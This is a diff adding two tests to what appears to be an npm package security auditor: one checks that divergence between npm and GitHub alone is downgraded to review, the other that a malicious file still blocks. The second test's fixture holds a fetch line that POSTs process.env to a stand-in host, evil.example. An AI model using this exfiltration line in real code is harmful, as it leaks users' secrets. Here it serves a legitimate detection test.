@@ -139,3 +139,64 @@ test("strips ANSI escape sequences and C0/C1 control bytes from finding snippets
     );
   }
 });
+
+// npm-vs-github divergence is a REVIEW-level signal, not an auto-block. It fires
+// on every legitimate package that builds/transpiles/bundles before publish
+// (dayjs, helmet, nanoid, zustand, react, ... all diverge from their repo tree),
+// so divergence ALONE must downgrade to review, never block. Regression for the
+// systemic false-positive sweep that flagged ~half of the most-used packages.
+test("npm-vs-github divergence alone is review, not block", () => {
+  const report = auditEvidence({
+    packageName: "built-pkg",
+    sourceFiles: {
+      "package.json": JSON.stringify({
+        name: "built-pkg",
+        repository: "https://github.com/example/built-pkg"
+      }),
+      "index.js": "exports.run = () => 'ok';"
+    },
+    npmVsGithubDiff: {
+      compared: true,
+      githubRef: "v1.0.0",
+      counts: { npmFiles: 10, matched: 8, extraSource: 3, mismatchedSource: 2 },
+      suspiciousExtras: [{ category: "extra-source", path: "dist/built.js" }],
+      suspiciousMismatches: [{ category: "content-mismatch-source", path: "lib/min.js" }]
+    }
+  });
+
+  assert.equal(report.verdict, "review");
+  assert.notEqual(report.grade, "F");
+  const divergence = report.findings.filter(
+    (f) => f.category === "npm-vs-github-divergence"
+  );
+  assert.ok(divergence.length > 0, "divergence finding should be present");
+  assert.ok(
+    divergence.every((f) => f.severity === "medium"),
+    "divergence findings must be medium, not high"
+  );
+});
+
+// Downgrading divergence must NOT mask a genuinely malicious file shipped
+// alongside it — a real high-severity finding still blocks.
+test("real malicious code still blocks even when divergence is present", () => {
+  const report = auditEvidence({
+    packageName: "evil-pkg",
+    sourceFiles: {
+      "package.json": JSON.stringify({
+        name: "evil-pkg",
+        repository: "https://github.com/example/evil-pkg"
+      }),
+      "index.js":
+        "fetch('https://evil.example/x', { method: 'POST', body: JSON.stringify(process.env) });"
+    },
+    npmVsGithubDiff: {
+      compared: true,
+      githubRef: "v1.0.0",
+      counts: { npmFiles: 10, matched: 8, extraSource: 1, mismatchedSource: 0 },
+      suspiciousExtras: [{ category: "extra-source", path: "index.js" }],
+      suspiciousMismatches: []
+    }
+  });
+
+  assert.equal(report.verdict, "block");
+});
